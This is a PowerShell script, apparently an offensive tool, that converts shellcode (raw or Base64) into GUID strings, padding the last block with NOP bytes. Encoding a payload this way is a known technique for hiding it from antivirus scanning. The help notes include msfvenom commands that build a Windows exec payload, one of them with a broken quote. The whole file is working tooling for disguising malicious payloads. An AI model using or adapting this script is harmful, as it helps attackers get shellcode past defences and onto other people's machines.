<#
.SYNOPSIS
    Converts shellcode into UUID (GUID) format from either a raw binary file, a Base64-encoded file, or from strings.

.NOTES
    Examples of creating shellcode:

    # Generate raw shellcode and then encode to Base64 (for -Base64InputFile):
    msfvenom -p windows/x64/exec CMD=cmd.exe -f raw -o out.bin & cat out.bin | base64 -w 0 | tee Base64-Shellcode.txt

    # Generate raw shellcode to feed directly into -InputFilePath:
    msfvenom -p windows/x64/exec CMD="cmd.exe -f raw -o Shellcode.bin

    # Example usage:
    # Convert-UUID -Base64InputFilePath "C:\Users\Hacker\Desktop\Base64-Shellcode.txt"
    # Convert-UUID -InputFilePath "C:\Users\Hacker\Desktop\Shellcode.bin"
    # Convert-UUID -InputStrings "VipeOne"

#>

function Convert-UUID {
    [CmdletBinding(DefaultParameterSetName = 'File')]
    param (
        [Parameter(Mandatory = $true, ParameterSetName = 'File')]
        [string]$InputFilePath,

        [Parameter(Mandatory = $true, ParameterSetName = 'Base64File')]
        [string]$Base64InputFilePath,

        [Parameter(Mandatory = $true, ParameterSetName = 'Strings')]
        [string[]]$InputStrings
    )

    if ($PSCmdlet.ParameterSetName -eq 'File') {
        $bin = [System.IO.File]::ReadAllBytes($InputFilePath)
        Process-Binary $bin $InputFilePath

    } elseif ($PSCmdlet.ParameterSetName -eq 'Base64File') {
        $base64Content = Get-Content -Path $Base64InputFilePath -Raw
        $bin = [Convert]::FromBase64String($base64Content)
        Process-Binary $bin $Base64InputFilePath

    } elseif ($PSCmdlet.ParameterSetName -eq 'Strings') {
        foreach ($string in $InputStrings) {
            $byteArray = [System.Text.Encoding]::UTF8.GetBytes($string)

            if ($byteArray.Length -lt 16) {
                $ZerosToAdd = 16 - $byteArray.Length
                $padding = @(0x00) * $ZerosToAdd
                $byteArray += $padding
            }
            elseif ($byteArray.Length -gt 16) {
                $byteArray = $byteArray[0..15]
            }

            $bytesData1 = $byteArray[0..3]
            $bytesData2 = $byteArray[4..5]
            $bytesData3 = $byteArray[6..7]
            $bytesData4 = $byteArray[8..15]

            if ([BitConverter]::IsLittleEndian) {
                [Array]::Reverse($bytesData1)
                [Array]::Reverse($bytesData2)
                [Array]::Reverse($bytesData3)
            }

            $Data1 = [BitConverter]::ToUInt32($bytesData1, 0)
            $Data2 = [BitConverter]::ToUInt16($bytesData2, 0)
            $Data3 = [BitConverter]::ToUInt16($bytesData3, 0)
            $Data4 = $bytesData4

            $uuid = New-Object System.Guid ($Data1, $Data2, $Data3, $Data4)
            $varName = "d" + ($string -replace '[^a-zA-Z0-9_]', '')
            Write-Host "`$$varName = `"$uuid`""
        }
    }
}

function Process-Binary {
    param (
        [byte[]]$bin,
        [string]$InputFilePath
    )

    $offset = 0
    $output = ""

    Write-Host "Length of shellcode: $($bin.Length) bytes"

    while ($offset -lt $bin.Length) {
        $countOfBytesToConvert = $bin.Length - $offset
        if ($countOfBytesToConvert -lt 16) {
            $ZerosToAdd = 16 - $countOfBytesToConvert
            $padding = @(0x90) * $ZerosToAdd
            $byteArray = $bin[$offset..($bin.Length - 1)] + $padding
        }
        else {
            $byteArray = $bin[$offset..($offset + 15)]
        }

        $Data1 = [BitConverter]::ToInt32($byteArray, 0)
        $Data2 = [BitConverter]::ToInt16($byteArray, 4)
        $Data3 = [BitConverter]::ToInt16($byteArray, 6)
        $Data4 = $byteArray[8..15]

        $uuid = New-Object System.Guid ($Data1, $Data2, $Data3, $Data4)
        $offset += 16
        $output += "`"$uuid`",`n"
    }

    $outputFilePath = "$InputFilePath.UUIDs"
    Set-Content -Path $outputFilePath -Value $output

    Write-Host "Out file: $outputFilePath"
}
